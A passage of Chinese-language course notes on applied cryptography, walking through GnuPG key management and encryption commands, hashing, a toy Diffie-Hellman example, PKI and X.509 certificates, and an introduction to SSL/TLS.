<li>公开公钥P，保密密钥S</li>
<li>使用密钥S来加密消息M</li>
<li>发送给接收者S(M)</li>
</ul>

<p>
接收者
</p>

<ul class="org-ul">
<li>使用发送者的公钥来解密M=P(S(M))</li>
</ul>

<p>
<b>RSA和DSA</b> （了解）
</p>

<p>
RSA：公钥加密算法是1977年由Ron Rivest、Adi Shamirh和LenAdleman在（美国
麻省理工学院）开发的，RSA取名来自开发他们三者的名字，后成立RSA数据安全
有限公司。RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知
的所有密码攻击，已被ISO推荐为公钥数据加密标准。RSA算法基于一个十分简单
的数论事实：将两个大素数相乘十分容易，但那时想要对其乘积进行因式分解却
极其困难，因此可以将乘积公开作为加密密钥
</p>


<p>
DSA (Digital Signature Algorithm)：1991年7月26日提交，并归属于David W.
Kravitz前NSA员工，DSA是Schnorr和ElGamal签名算法的变种，被美国NIST作为
SS(DigitalSignature Standard)，DSA是基于整数有限域离散对数难题的，其安
全性与RSA相比差不多。DSA只是一种算法，和RSA不同之处在于它不能用作加密
和解密，也不能进行密钥交换，只用于签名,它比RSA要快很多
</p>
</div>
</div>
<div id="outline-container-h:e9c54822-16b9-45d4-89ec-4ae7d81b914a" class="outline-4">
<h4 id="h:e9c54822-16b9-45d4-89ec-4ae7d81b914a">使用gpg实现对称和非对称加密</h4>
<div class="outline-text-4" id="text-h:e9c54822-16b9-45d4-89ec-4ae7d81b914a">
</div>
<div id="outline-container-h:e029b916-581f-41ba-aabb-6d6b5f6b5008" class="outline-5">
<h5 id="h:e029b916-581f-41ba-aabb-6d6b5f6b5008">主目录与配置文件</h5>
<div class="outline-text-5" id="text-h:e029b916-581f-41ba-aabb-6d6b5f6b5008">
<p>
GnuPG 套件将密钥环和私钥存储在 GnuPG 主目录，并从中读取配置。默认路径
为 <code>~/.gnupg</code> 。有两种方法可以改变主目录的路径：
</p>

<ul class="org-ul">
<li>设置 $GNUPGHOME 环境变量。</li>
<li>使用 <code>--homedir</code> 参数，如 <code>$ gpg --homedir /path/to/dir</code> 。</li>
</ul>

<p>
GnuPG 的所有行为都可以通过命令行参数进行配置。对于您希望成为默认参数的
参数，可以将它们添加到相应的配置文件中：
</p>

<ul class="org-ul">
<li>gpg 检查 <code>gnupg_home/gpg.conf</code> （用户）和 <code>/etc/gnupg/gpg.conf</code> （全
局）。由于 gpg 是 GnuPG 的主要入口点，因此大部分感兴趣的配置都在这里。
请参阅 <a href="https://www.gnupg.org/documentation/manuals/gnupg/GPG-Options.html">GPG 选项</a> 获取可能的选项。</li>
<li>dirmngr 会检查 <code>gnupg_home/dirmngr.conf</code> 和
<code>/etc/gnupg/dirmngr.conf</code> 两个配置文件。dirmngr是由 gpg 内部调用的程
序，用于访问 PGP 密钥服务器。请参阅<a href="https://www.gnupg.org/documentation/manuals/gnupg/Dirmngr-Options.html">Dirmngr 选项</a>以了解可能的选项。</li>
</ul>
</div>
</div>
<div id="outline-container-h:3e2bc31a-c23e-4f1b-9c16-e36730f4bbe7" class="outline-5">
<h5 id="h:3e2bc31a-c23e-4f1b-9c16-e36730f4bbe7">实现公钥加密</h5>
<div class="outline-text-5" id="text-h:3e2bc31a-c23e-4f1b-9c16-e36730f4bbe7">
<p>
目标：在hostB主机上用A的公钥加密，在hostA主机上解密 B &#x2014;&gt; A
</p>

<p>
<b>创建密钥对</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg --gen-key 
<span style="color: #b22222;"># </span><span style="color: #b22222;">gpg --full-gen-key # &#26159; --gen-key &#30340;&#25193;&#23637;&#29992;&#27861;</span>
</pre>
</div>

<p>
范例：在hostA主机上生成公钥/私钥对
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@node01 ~]$ gpg --gen-key
Your selection?1&lt;Enter&gt;                       <span style="color: #b22222;">##</span><span style="color: #b22222;">&#40664;&#35748;&#21363;&#21487;</span>
What keysize<span style="color: #a020f0;"> do</span> you want? (2048) 1024&lt;Enter&gt;  <span style="color: #b22222;">##</span><span style="color: #b22222;">&#23494;&#38053;&#38271;&#24230;&#65292;&#26377;&#26102;&#21487;&#33021;&#22240;&#20026;&#38543;&#26426;&#25968;&#19981;&#22815;&#23548;&#33268;&#21345;&#22312;&#37027;&#37324;&#65292;&#36825;&#26102;&#20505;&#20320;&#23601;yum &#23433;&#35013;&#20960;&#20010;&#21253;&#32452;&#65292;&#39532;&#19978;&#23601;&#22815;&#20102;</span>
Key is valid for? (0) 1y&lt;Enter&gt;               <span style="color: #b22222;">##</span><span style="color: #b22222;">&#26377;&#25928;&#26399;</span>
Is this correct? (y/N) y&lt;Enter&gt;               <span style="color: #b22222;">##</span><span style="color: #b22222;">&#30830;&#35748;</span>
Real name: Client&lt;Enter&gt;                      <span style="color: #b22222;">##</span><span style="color: #b22222;">&#23494;&#38053;&#21517;&#31216;&#65292;5&#20010;&#23383;&#31526;&#20197;&#19978;</span>
Email address:xcwhome@gmail.com&lt;Enter&gt;        <span style="color: #b22222;">##</span><span style="color: #b22222;">&#37038;&#20214;&#65292;&#38750;&#21457;&#36215;&#24517;&#22635;</span>
Comment: GPG-KEY&lt;Enter&gt;                       <span style="color: #b22222;">##</span><span style="color: #b22222;">&#22791;&#27880;</span>

You selected this USER-ID:
<span style="color: #8b2252;">"Jasper Hsu <a href="mailto:xcwhome%40gmail.com">&lt;xcwhome@gmail.com&gt;</a>"</span>
<span style="color: #0000ff;">Change</span> (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O&lt;ENTER&gt;   <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30830;&#35748;</span>
Enter passphrase  OK &lt;Enter&gt;                  <span style="color: #b22222;">##</span><span style="color: #b22222;">&#20351;&#29992;&#31354;&#23494;&#30721;&#65292;&#20063;&#21487;&#20197;&#36755;&#20837;                             </span>
&lt;Take this one anyway&gt; &lt;Enter&gt;
&lt;Take this one anyway&gt; &lt;Enter&gt;
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#38543;&#24847;&#31227;&#21160;&#40736;&#26631;&#65292;&#25970;&#20987;&#38190;&#30424;&#65292;&#25910;&#38598;&#36275;&#22815;&#30340;&#38543;&#26426;&#23383;&#31526;&#65292;&#20135;&#29983;&#23494;&#38053;&#12290;</span>
</pre>
</div>

<p>
<b>查看密钥</b>
</p>

<p>
查看公钥
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg --list-keys
</pre>
</div>

<p>
查看私钥
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg --list-secret-keys
</pre>
</div>

<p>
范例： 在hostA主机上
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#20844;&#38053;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">gpg --list-keys</span>
/root/.gnupg/pubring.gpg
------------------------
pub   1024R/01CD064A 2024-02-25 [expires: 2025-02-24]
uid                  Client (GPG-KEY) <a href="mailto:xcwhome%40gmail.com">&lt;xcwhome@gmail.com&gt;</a>
sub   1024R/2C1E092D 2024-02-25 [expires: 2025-02-24]

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#31169;&#38053;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">gpg --list-secret-keys</span>
/root/.gnupg/secring.gpg
------------------------
sec   1024R/01CD064A 2024-02-25 [expires: 2025-02-24]
uid                  Client (GPG-KEY) <a href="mailto:xcwhome%40gmail.com">&lt;xcwhome@gmail.com&gt;</a>
ssb   1024R/2C1E092D 2024-02-25
</pre>
</div>

<p>
<b>导出公钥</b>
</p>

<p>
GPG 的主要用途是通过公钥加密信息以确保其私密性。你可以分发自己的公钥，而其他人通过该公钥加密发给你的信息。而你的私钥必须始终保密，否则将会威胁信息的私密性。
</p>

<p>
所以其他人需要有你的公钥才能给你发加密信息。
</p>

<p>
以下命令可生成公钥的 ASCII 版本（&#x2013;armor 参数）（例如用于以电子邮件发布）：
</p>
<div class="org-src-container">
<pre class="src src-sh">gpg --export --armor --output public-key.asc user-id

<span style="color: #b22222;"># </span><span style="color: #b22222;">--armorg -a: &#29983;&#25104;&#20844;&#38053;&#30340; ASCII &#29256;&#26412;&#12290;&#40664;&#35748;&#35774;&#32622;&#26159;&#21019;&#24314;&#20108;&#36827;&#21046; OpenPGP &#26684;&#24335;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">--output -o: &#23558;&#36755;&#20986;&#20889;&#20837;&#25991;&#20214;&#12290;&#33509;&#35201;&#20889;&#20837; stdout&#65292;&#35831;&#20351;&#29992; - &#20316;&#20026;&#25991;&#20214;&#21517;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">--export: &#20174;&#25152;&#26377;&#23494;&#38053;&#29615;&#20013;&#23548;&#20986;&#25152;&#26377;&#23494;&#38053;&#65292;&#25110;&#32773;&#22914;&#26524;&#33267;&#23569;&#32473;&#23450;&#19968;&#20010;&#21517;&#31216;&#65292;&#21017;&#23548;&#20986;&#32473;&#23450;&#21517;&#31216;&#30340;&#23494;&#38053;&#12290;&#23548;&#20986;&#30340;&#23494;&#38053;&#23558;&#20889;&#20837; STDOUT &#25110;&#24102;&#26377;&#36873;&#39033; --output &#30340;&#25991;&#20214;&#20013;&#12290;&#19982;&#19968;&#36215;&#20351;&#29992; --armor &#20197;&#37038;&#23492;&#36825;&#20123;&#23494;&#38053;&#12290; </span>
</pre>
</div>

<p>
提示：
</p>
<pre class="example" id="orgae3f056">
使用 --no-emit-version 可以避免打印版本号，通过配置文件也可以进行此设置。

可以省略 user-id 以导出密钥环内所有的公钥。这可以用来分享多个身份，或是将其导入到另一个程序，比如 Thunderbird。
</pre>

<p>
输入输出选项： <a href="https://www.gnupg.org/documentation/manuals/gnupg/GPG-Input-and-Output.html">https://www.gnupg.org/documentation/manuals/gnupg/GPG-Input-and-Output.html</a>
</p>

<p>
范例：在hostA主机上导出公钥到client.pubkey
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">gpg --export -a -o client.pubkey 'Client'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#29992;&#25143; id &#20026; Client &#20844;&#38053;&#20869;&#23481;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">gpg --export -a 'Client'</span>
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v2.0.22 (GNU/Linux)

mI0EYD51TwEEAOL/dBA7bAtBfFraTM9rW7QfcyICSEGOtCfJjjEzNHyNGNsAlZXe
aCurLXaYJHne1wSvyOc4Tv9eXqp+FbCM2Itow1gKWiVxAhp/36Dcf2c0KvCCipQD
+eq9DBx77+/KE0KO+eXXQvoDuaE8zl0MfFJVtNS25aSlQeFwU6T5fhRxABEBAAG0
EkNsaWVudCAoIkdQRy1LRVkiKYi5BBMBAgAjBQJgPnVPAhsDBwsJCAcDAgEGFQgC
CQoLBBYCAwECHgECF4AACgkQ9y3a/SwV2bHEhAQA2aa3P+DHy3i/fcz2sDi25uYS
WWjlDyY2Sis1E1r9yl7mihMjP5WbbQ+o/9wn2nqk3EKnot8tSkp9rE+1pk1Uth1i
MBiuEL2OZep3W6Ee9Hi0rIUu6MhAwHAT2y0bp33FajG4amn8kKSxUZ5UBaLdekBU
gutPdWQsTZemWi3ITn24jQRgPnVPAQQA6Ny/BkcQ6rWOKf1k5uOfEjLKi88SFVsy
9DvKUoN1bzACTQUWAtjOv3ncJYbxNmCDzzte6727nmIMfxEjDHQhGz1bCqlcq6pm
hwfTSgl1CL9nxtPLV1XdsqmE++gorsA1XkqnLvylfSlnwrVVTjhHNsE3HJiiDC3j
9wDI7d4c7e8AEQEAAYifBBgBAgAJBQJgPnVPAhsMAAoJEPct2v0sFdmxKUMEANcN
Wv6cCxj9EaECiwNVUEGtAJH6wh+ibpbFBXhp/n6Tt0dpOcsuce829ixsoYlQ/lmK
0zyitTrImkWz3NQlvE+GSVg2zGuOuOK4hHZB+EURBGWnG31Z36nxVfcV//D3EU9g
CaoG9JIa4PljqFxwg5EGU973uKOzpaJF/sqLim5Y
=Q1fR
-----END PGP PUBLIC KEY BLOCK-----
</pre>
</div>

<p>
<b>导入公共密钥</b>
</p>

<p>
要给其他人发送加密信息，或者验证他们的签名，就需要他们的公钥。通过文件 public.key 导入公钥到密钥环
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg --import public.key.asc
</pre>
</div>

<p>
范例： 在hostB主机上导入公钥
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20174;hostA&#20027;&#26426;&#19978;&#22797;&#21046;&#20844;&#38053;&#25991;&#20214;&#21040;&#38656;&#21152;&#23494;&#30340;B&#20027;&#26426;&#19978;</span>
scp client.pubkey hostB:

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22312;&#38656;&#21152;&#23494;&#25968;&#25454;&#30340;hostB&#20027;&#26426;&#19978;&#29983;&#25104;&#20844;&#38053;/&#31169;&#38053;&#23545;</span>
gpg --list-keys
gpg --gen-key

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22312;hostB&#20027;&#26426;&#19978;&#23548;&#20837;&#20844;&#38053;</span>
gpg --import client.pubkey
gpg --list-keys
</pre>
</div>

<p>
范例： 文件加密与解密
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#20174;hostA&#20027;&#26426;&#23548;&#20837;&#30340;&#20844;&#38053;&#65292;&#21152;&#23494;hostB&#20027;&#26426;&#30340;&#25991;&#20214;file,&#29983;&#25104;file.gpg</span>
gpg -e -r client file  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20197;client&#30340;&#36523;&#20221;&#21152;&#23494;&#25991;&#20214;</span>
file file.gpg

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22797;&#21046;&#21152;&#23494;&#25991;&#20214;&#21040;hostA&#20027;&#26426;</span>
scp fstab.gpg hostA:

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22312;hostA&#20027;&#26426;&#35299;&#23494;&#25991;&#20214;</span>
gpg -d file.gpg
gpg -o file -d file.gpg
</pre>
</div>

<p>
删除公钥和私钥
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg --delete-secret-keys wclient <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21024;&#38500;&#31169;&#38053;</span>
gpg --delete-keys client <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21024;&#38500;&#20844;&#38053;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7328a823-6fb7-4830-89d7-22b38d184511" class="outline-5">
<h5 id="h:7328a823-6fb7-4830-89d7-22b38d184511">使用公钥服务器</h5>
<div class="outline-text-5" id="text-h:7328a823-6fb7-4830-89d7-22b38d184511">
<p>
<b>发布公钥</b>
</p>

<p>
你可以将你的公钥注册到一个公共的密钥服务器，这样其他人不用联系你就能获取到你的公钥：
</p>
<div class="org-src-container">
<pre class="src src-sh">gpg --send-keys key-id

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35686;&#21578;&#65306; &#19968;&#26086;&#19968;&#20010;&#20844;&#38053;&#34987;&#21457;&#36865;&#21040;&#23494;&#38053;&#26381;&#21153;&#22120;&#65292;&#23427;&#23601;&#26080;&#27861;&#20174;&#26381;&#21153;&#22120;&#19978;&#21024;&#38500;</span>
</pre>
</div>

<p>
<b>搜索和接收公钥</b>
</p>

<p>
要查询公钥的详细信息而不是导入，执行：
</p>
<div class="org-src-container">
<pre class="src src-sh">gpg --search-keys user-id
</pre>
</div>

<p>
要导入一个公钥：
</p>
<div class="org-src-container">
<pre class="src src-sh">gpg --receive-keys key-id
</pre>
</div>

<p>
要使用密钥服务器中的最新版本刷新/更新钥匙串：
</p>
<div class="org-src-container">
<pre class="src src-sh">gpg --refresh-keys
</pre>
</div>

<p>
<b>公钥服务器</b>
常见的公钥服务器：
</p>

<ul class="org-ul">
<li><a href="https://keyserver.ubuntu.com/">Ubuntu Keyserver</a>：联盟式（federated）、没有验证、公钥不可删除。</li>
<li><a href="https://keys.mailvelope.com/">Mailvelope Keyserver</a>：中心式、验证电邮 ID、公钥可删除。</li>
<li><a href="https://keys.openpgp.org/">keys.openpgp.org</a>：中心式、验证电邮 ID、公钥可删除、没有第三方签名（即不支持信任网络）</li>
</ul>

<p>
备选公钥服务器可以在#配置文件中的 keyserver 选项中注明，例如：
</p>
<div class="org-src-container">
<pre class="src src-sh">~/.gnupg/dirmngr.conf
keyserver hkp://keyserver.ubuntu.com
</pre>
</div>

<p>
当常规服务器无法正常工作时，临时使用另一台服务器很方便。例如，可以通过以下方法实现：
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg --keyserver hkps://keys.openpgp.org/ --search-keys user-id
</pre>
</div>
</div>
</div>
<div id="outline-container-h:cc6db102-bb99-4d0c-a9ce-0a3db46dc8e7" class="outline-5">
<h5 id="h:cc6db102-bb99-4d0c-a9ce-0a3db46dc8e7">实现加密与解密</h5>
<div class="outline-text-5" id="text-h:cc6db102-bb99-4d0c-a9ce-0a3db46dc8e7">
<p>
<b>非对称加解密</b>
</p>

<p>
在加密（参数 <code>--encrypt</code> 或 <code>-e</code> ）一个文件或一条信息给另外一个人（参
数 <code>--recipient</code> 或 <code>-r</code> ）之前，你需要先导入他的公钥。
</p>

<p>
要加密一个名为 doc 的文件：
</p>
<div class="org-src-container">
<pre class="src src-sh">gpg --recipient user-id --encrypt doc
</pre>
</div>

<p>
要解密（参数 <code>--decrypt</code> 或 <code>-d</code> ）一个用你的公钥加密的、名为 doc.gpg 的文件：
</p>
<div class="org-src-container">
<pre class="src src-sh">gpg --output doc --decrypt doc.gpg
</pre>
</div>


<p>
<b>对称加密与解密</b>
</p>

<p>
对称加密不需要生成密钥对，可用来简单地给文件加上密码。使用 <code>-c/--symmetric</code> 参数来进行对称加密:
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg -c file <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36755;&#20837;&#21475;&#20196;&#23494;&#30721;&#65292;&#29983;&#25104;file.gpg&#30340;&#23494;&#30721;</span>
</pre>
</div>

<p>
在另一台主机上解密file，并将解密的文档输出到同一目录下的 file.gpg 文件中:
</p>

<div class="org-src-container">
<pre class="src src-sh">gpg -o file -d file.gpg
</pre>
</div>

<p>
我鼓励你学习如何对电子邮件通信使用加密，并将其建立为受信任联系人的默认
方法。你无需成为技术向导即可实现它。开始阅读自由软件基金会关于<a href="https://emailselfdefense.fsf.org/en/">电子邮件
自卫</a>的优秀指南。
</p>

<p>
参考：
</p>
<ul class="org-ul">
<li>Archlinux wiki GPG: <a href="https://wiki.archlinuxcn.org/wiki/GnuPG">https://wiki.archlinuxcn.org/wiki/GnuPG</a></li>
<li>GnuPG HOWTO (中文版) <a href="http://www.gnupg.org/howtos/zh/">http://www.gnupg.org/howtos/zh/</a></li>
<li>GPG(pgp)加解密中文完整教程 <a href="http://www.alexgao.com/2009/01/24/gpg">http://www.alexgao.com/2009/01/24/gpg</a></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:f633a61d-cdd2-49ba-bd9b-b844f0a89bfd" class="outline-4">
<h4 id="h:f633a61d-cdd2-49ba-bd9b-b844f0a89bfd">单向哈希算法</h4>
<div class="outline-text-4" id="text-h:f633a61d-cdd2-49ba-bd9b-b844f0a89bfd">
<p>
哈希算法：也称为散列算法，将任意数据缩小成固定大小的“指纹”，称为digest，即摘要
</p>

<p>
特性：
</p>

<ul class="org-ul">
<li>任意长度输入，固定长度输出</li>
<li>若修改数据，指纹也会改变，且有雪崩效应，数据的一点微小改变，生成的指纹值变化非常大。</li>
<li>无法从指纹中重新生成数据，即不要逆，具有单向性</li>
</ul>

<p>
功能：数据完整性
</p>

<p>
常见算法 md5: 128bits、sha1: 160bits、sha224 、sha256、sha384、sha512
</p>

<p>
常用工具
</p>

<ul class="org-ul">
<li>md5sum | sha1sum [ &#x2013;check ] file</li>
<li>openssl、gpg</li>
<li>rpm -V</li>
</ul>

<p>
<b>数字签名</b>
</p>


<figure id="orga9de59a">
<img src="images/image-20210120153936904.png" alt="image-20210120153936904.png" width="50%">

</figure>

<p>
RPM 文件完整性
</p>
<div class="org-src-container">
<pre class="src src-sh">rpm --verify package_name (or -V)
rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat*
rpm --checksig pakage_file_name (or-K)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0e048834-04f1-4a53-8b08-0cd92f22bec1" class="outline-4">
<h4 id="h:0e048834-04f1-4a53-8b08-0cd92f22bec1">综合应用多种加密算法</h4>
<div class="outline-text-4" id="text-h:0e048834-04f1-4a53-8b08-0cd92f22bec1">
<p>
<b>实现数据加密</b>
</p>

<p>
实现数据加密，无法验证数据完整性和来源
</p>


<figure id="org73cd87d">
<img src="images/image-20210303023818589.png" alt="image-20210303023818589.png" width="50%">

</figure>


<figure id="orgb8e6a08">
<img src="images/image-20210120154029857.png" alt="image-20210120154029857.png" width="50%">

</figure>

<p>
<b>实现数字签名</b>
</p>

<p>
不加密数据，可以保证数据来源的可靠性、数据的完整性和一致性
</p>


<figure id="org9a60b47">
<img src="images/image-20210120154059975.png" alt="image-20210120154059975.png" width="50%">

</figure>

<p>
<b>综合加密和签名</b>
</p>

<p>
即实现数据加密，又可以保证数据来源的可靠性、数据的完整性和一致性
</p>

<p>
方法1：Pb{Sa[hash(data)]+data}
</p>


<figure id="orgaddc437">
<img src="images/image-20210120154128669.png" alt="image-20210120154128669.png" width="50%">

</figure>

<p>
方法2：对称key{Sa[hash(data)]+data}+Pb(对称key)
</p>


<figure id="org761cdeb">
<img src="images/image-20210120154155432.png" alt="image-20210120154155432.png" width="50%">

</figure>


<figure id="org7ce8250">
<img src="images/data-ssl.jpg" alt="data-ssl.jpg" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:2a933844-09c2-4963-8ec3-d7522b0bde13" class="outline-4">
<h4 id="h:2a933844-09c2-4963-8ec3-d7522b0bde13">密码交换</h4>
<div class="outline-text-4" id="text-h:2a933844-09c2-4963-8ec3-d7522b0bde13">
<p>
密钥交换：IKE（ Internet Key Exchange ）
</p>

<ul class="org-ul">
<li>公钥加密：用目标的公钥加密对称密钥</li>
<li><p>
DH (Deffie-Hellman)：生成对称（会话）密钥，由惠特菲尔德·迪菲（Bailey
Whitfield Diffie）和马丁·赫尔曼（Martin Edward Hellman）在1976年发表
</p>

<p>
参看：<a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange</a>
</p></li>
</ul>

<p>
DH 实现过程：
</p>

<pre class="example" id="orgfc13b31">
A: g,p 协商生成公开的整数g, 大素数p
B: g,p
A:生成隐私数据:a (a&lt;p)，计算得出 g^a%p，发送给B
B:生成隐私数据:b,(b&lt;p)，计算得出 g^b%p，发送给A
A:计算得出 [(g^b%p)^a] %p = g^ab%p，生成为密钥
B:计算得出 [(g^a%p)^b] %p = g^ab%p，生成为密钥
</pre>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">g</span>=23
<span style="color: #a0522d;">p</span>=5

A:
<span style="color: #a0522d;">a</span>=6
23^6%<span style="color: #a0522d;">5</span>=4
2^6%<span style="color: #a0522d;">5</span>=4

B:
<span style="color: #a0522d;">b</span>=15
23^15%<span style="color: #a0522d;">5</span>=2

4^15%5
[root@centos8 ~]#echo 23^15%5|bc
2
[root@centos8 ~]#echo 23^6%5|bc
4
[root@centos8 ~]#echo 2^6%5|bc
4
[root@centos8 ~]#echo 4^15%5|bc
4
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:15736226-3317-4725-a36d-71ddb2ffcef9" class="outline-3">
<h3 id="h:15736226-3317-4725-a36d-71ddb2ffcef9">CA和证书</h3>
<div class="outline-text-3" id="text-h:15736226-3317-4725-a36d-71ddb2ffcef9">
</div>
<div id="outline-container-h:dc203430-a41c-49f6-8b1a-9aa92e1fdbc2" class="outline-4">
<h4 id="h:dc203430-a41c-49f6-8b1a-9aa92e1fdbc2">中间人攻击</h4>
<div class="outline-text-4" id="text-h:dc203430-a41c-49f6-8b1a-9aa92e1fdbc2">
<p>
Man-in-the-middle，简称为 MITM，中间人
</p>

<figure id="org5bffcaf">
<img src="images/image-20210120154225691.png" alt="image-20210120154225691.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:fde4a67e-c078-4fc3-944c-ca54747208d2" class="outline-4">
<h4 id="h:fde4a67e-c078-4fc3-944c-ca54747208d2">CA和证书</h4>
<div class="outline-text-4" id="text-h:fde4a67e-c078-4fc3-944c-ca54747208d2">

<figure id="org5d0e584">
<img src="images/image-20210120154454189.png" alt="image-20210120154454189.png" width="50%">

</figure>


<figure id="orgcc4a443">
<img src="images/image-20210120154716488.png" alt="image-20210120154716488.png" width="50%">

</figure>

<p>
电脑上默认安装了很多要ca的证书
</p>

<p>
控制面板&#x2013;internet选项&#x2013;内容&#x2013;证书
</p>


<figure id="org67319d5">
<img src="images/image-20210304073450321.png" alt="image-20210304073450321.png" width="50%">

</figure>

<p>
PKI：Public Key Infrastructure 公共密钥加密体系
</p>

<pre class="example" id="orgfd18bec">
1)签证机构：CA（Certificate Authority）
用户在注册机构注册证书，CA就会签发用户的公钥认证，并且和申请者的信息绑定在一起并且签名后，以证书形式发给申请者，然后在本地的证书存取库备份。（可以理解成现实社会的公安部）
2)注册机构：RA
一般用户都是在这里注册证书（可以理解成现实社会的派出所）
3)证书吊销列表：CRL
如果用户私钥丢失，必须要申请吊销证书，否则可能会被别人冒名顶替。
4)证书存取库：CB,公共存储证书位置
所有发出的证书都会在这里存一份，如果丢失证书可以在这里得到，如果丢失私钥那么只能申请证书撤销
</pre>

<p>
X.509：定义了证书的结构以及认证协议标准
</p>

<ul class="org-ul">
<li>版本号：标识证书的版本</li>
<li>序列号：标识证书的唯一证书，类似于身份证</li>
<li>签名算法ID：证书的算法标识</li>
<li>颁发者：证书颁发这的可识别名</li>
<li>有效期限：证书有效的时间段</li>
<li>主体名称：证书拥有着的可识别名</li>
<li>主体公钥：关键部分</li>
<li>发行者的唯一标识：证书颁发者的唯一标识符</li>
<li>主体的唯一标识：证书拥有者的唯一标识符</li>
<li>扩展信息</li>
<li>发行者的签名：证书颁发者对证书的签名，上述整个内容做单向加密，得到的
特征码用自己私钥加密，并附加到后面，用来生产发行者的签名；</li>
</ul>

<p>
证书类型：
</p>

<ul class="org-ul">
<li>证书授权机构的证书</li>
<li>服务器证书</li>
<li>用户证书</li>
</ul>

<p>
获取证书两种方法：
</p>

<ul class="org-ul">
<li>自签名的证书： 自已签发自己的公钥</li>
<li>使用证书授权机构：
<ul class="org-ul">
<li>生成证书请求（csr）</li>
<li>将证书请求csr发送给CA</li>
<li>CA签名颁发证书</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:96594e0c-d118-4cc5-9b7d-ee7f4d5ed5b5" class="outline-4">
<h4 id="h:96594e0c-d118-4cc5-9b7d-ee7f4d5ed5b5">安全协议 SSL/TLS</h4>
<div class="outline-text-4" id="text-h:96594e0c-d118-4cc5-9b7d-ee7f4d5ed5b5">
</div>
<div id="outline-container-h:9203a793-e629-4edd-a1cd-dc37ec5f6fb5" class="outline-5">
<h5 id="h:9203a793-e629-4edd-a1cd-dc37ec5f6fb5">TLS 介绍</h5>
<div class="outline-text-5" id="text-h:9203a793-e629-4edd-a1cd-dc37ec5f6fb5">
<p>
SSL：Secure Socket Layer，TLS: Transport Layer Security
</p>

<ul class="org-ul">
<li>1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但
是未发布。用以保障在Internet上数据传输之安全，利用数据加密技术，可确
保数据在网络上之传输过程中不会被截取及窃听。</li>

<li>1995：SSL 2.0 Netscape 开发</li>

<li>1996：SSL 3.0</li>

<li>1999：TLS 1.0</li>

<li>2006：TLS 1.1 IETF(Internet工程任务组) RFC 4346，从2020年3月起，停止
支持TLS 1.1及TLS 1.0版本安全协议，谷歌（Chrome）、Mozilla（Firefox）、
微软（IE和Edge）、苹果（Safari） 都会发布新版浏览器执行这个策略</li>

<li>2008：TLS 1.2 当前主要使用</li>

<li>2018：TLS 1.3</li>
</ul>

<p>
功能：
</p>

<ul class="org-ul">
<li>机密性</li>
<li>认证</li>
<li>完整性</li>
<li>重放保护</li>
</ul>
</div>
</div>
<div id="outline-container-h:e4eec987-40c8-4eea-92b7-b8912a551498" class="outline-5">
<h5 id="h:e4eec987-40c8-4eea-92b7-b8912a551498">SSL/TLS组成</h5>
<div class="outline-text-5" id="text-h:e4eec987-40c8-4eea-92b7-b8912a551498">

<figure id="orgc217228">
<img src="images/ssl.jpg" alt="ssl.jpg" width="50%">

</figure>


<figure id="orgacae0ee">
<img src="images/image-20210120154851499.png" alt="image-20210120154851499.png" width="50%">

</figure>

<ul class="org-ul">
<li>Handshake协议：包括协商安全参数和密码套件、服务器身份认证（客户端身
份认证可选）、密钥交换</li>
<li>ChangeCipherSpec 协议：一条消息表明握手协议已经完成</li>
<li>Alert协议：对握手协议中一些异常的错误提醒，分为fatal和warning两个级
别，fatal类型错误会直接中断SSL链接，而warning级别的错误SSL链接仍可继
续，只是会给出错误警告</li>
<li>Record 协议：包括对消息的分段、压缩、消息认证和完整性保护、加密等</li>
</ul>
</div>
</div>
<div id="outline-container-h:03cc95e4-1936-4d0d-8d66-7e2ef6413dc3" class="outline-5">
<h5 id="h:03cc95e4-1936-4d0d-8d66-7e2ef6413dc3">TLS实现过程</h5>
<div class="outline-text-5" id="text-h:03cc95e4-1936-4d0d-8d66-7e2ef6413dc3">
<p>
